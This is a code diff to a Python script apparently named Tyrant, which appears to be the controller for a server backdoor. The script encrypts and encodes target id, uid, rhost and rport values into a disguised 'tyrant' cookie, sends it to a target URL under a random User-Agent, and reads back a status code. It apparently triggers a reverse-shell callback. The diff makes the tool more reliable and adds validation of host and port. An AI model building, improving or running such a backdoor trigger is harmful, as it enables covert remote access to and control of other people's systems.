@@ -1,5 +1,7 @@
 # Maptnh@S-HCK13
 import base64
+import ipaddress
+import json
 import requests
 import re
 import argparse
@@ -73,8 +75,13 @@ class Tyrant:
         return random.choice(user_agents)
     
     def send_payload(self):
-        data = f'{{"id":"{self.args.id}","uid":"{self.args.uid}","rhost":"{self.args.rhost}","rport":"{self.args.rport}"}}'
- 
+        data = json.dumps({
+            "id": self.args.id,
+            "uid": str(self.args.uid),
+            "rhost": self.args.rhost,
+            "rport": str(self.args.rport),
+        }, separators=(',', ':'))
+
         print(f"[*] Acquiring Target: {self.args.url}")
         data_bytes = data.encode('utf-8')
         mid_bytes = self.args.id.encode('utf-8')
@@ -84,20 +91,23 @@ class Tyrant:
         payload_1 = self.base64url_encode(p1_e)
         # PAYLAOD 2
         p2 = self.reverse_string(self.args.id).encode('utf-8')
-        p2_e = encs = self.xor_encrypt(self.get_timestamp().encode('utf-8'), p2)
+        p2_e = self.xor_encrypt(self.get_timestamp().encode('utf-8'), p2)
         payload_2 = self.base64url_encode(p2_e)
         payload = {'tyrant': header+'.'+payload_1+'.'+payload_2}
- 
-        
-        response = requests.post(self.args.url,
-                                cookies=payload,
-                                headers={'User-Agent': self.get_random_user_agent()})
-        
-        
 
+        try:
+            response = requests.post(
+                self.args.url,
+                cookies=payload,
+                headers={'User-Agent': self.get_random_user_agent()},
+                timeout=15,
+            )
+        except requests.RequestException as exc:
+            print(f"[!] Request failed: {exc}")
+            return
 
         if response.status_code == 200:
-            match = re.search(r"document\.getElementById\('bk'\)\.value\s*=\s*'(\d+)';", response.text)
+            match = re.search(r"document\.getElementById\('bk'\)\.value\s*=\s*'?(\d+)'?", response.text)
             if match:
                 status_code = int(match.group(1))
                 if status_code == 4130:
@@ -120,6 +130,25 @@ class Tyrant:
         
         if not all([self.args.id, self.args.uid, self.args.rhost, self.args.rport, self.args.url]):
             print("[!] Error: Missing required parameters.")
+            sys.exit(1)
+
+        if not str(self.args.uid).isdigit():
+            print("[!] Error: uid must be numeric.")
+            sys.exit(1)
+
+        try:
+            ipaddress.ip_address(self.args.rhost)
+        except ValueError:
+            print("[!] Error: rhost must be a valid IP address.")
+            sys.exit(1)
+
+        try:
+            port = int(self.args.rport)
+        except (TypeError, ValueError):
+            print("[!] Error: rport must be numeric.")
+            sys.exit(1)
+        if port < 1 or port > 65535:
+            print("[!] Error: rport must be between 1 and 65535.")
             sys.exit(1)
 
         self.send_payload()
